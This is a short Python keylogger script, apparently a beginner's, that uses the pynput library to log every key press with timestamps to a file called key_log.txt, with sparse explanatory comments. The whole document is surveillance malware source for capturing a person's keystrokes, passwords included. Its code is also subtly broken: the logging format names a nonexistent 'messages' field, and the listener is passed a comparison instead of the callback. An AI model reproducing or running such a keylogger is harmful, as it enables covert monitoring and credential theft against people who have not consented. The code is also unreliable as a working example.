from pynput.keyboard import Key, Listener
import logging
#if no name it gets put into an empty string
log_dir=''
#logging function
logging.basicConfig(filename=(log_dir+'key_log.txt'),level=logging.DEBUG,format='%(asctime)s:%(messages)s:')
#from library
def on_press(key):
    logging.info(str(key))
    #if key==key.esc:
        #stop listener
        #return False
#this says listener is on
with Listener(on_press==on_press) as listener:
    listener.join()
